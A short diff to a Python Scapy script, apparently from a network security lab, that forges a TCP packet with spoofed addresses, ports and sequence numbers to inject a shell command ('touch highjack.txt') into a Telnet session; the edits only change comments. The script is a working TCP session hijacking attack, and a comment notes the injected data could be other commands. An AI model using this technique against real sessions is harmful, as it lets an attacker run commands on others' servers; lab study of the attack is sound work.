@@ -3,9 +3,9 @@ from scapy.all import *
 
 # Define IP and TCP header fields
 ip = IP(src="192.168.182.138", dst="192.168.182.141")   # source IP is the client IP , destination IP is the server IP
-tcp = TCP(sport=57490, dport=23, seq=2762967913, ack=3184499808, flags="PA") # source port should be checked, destination port should be 23, check TELNET packet for the next sequence number
+tcp = TCP(sport=57490, dport=23, seq=2762967913, ack=3184499808, flags="PA") # source port should be checked, destination port should be 23, check TCP packet for the sequence number and ackknowledgemnet number
 
-# Data to be injected
+# Data to be injected, it could be other things
 data = "\rtouch highjack.txt\n\r"
 
 # Construct the RST packet
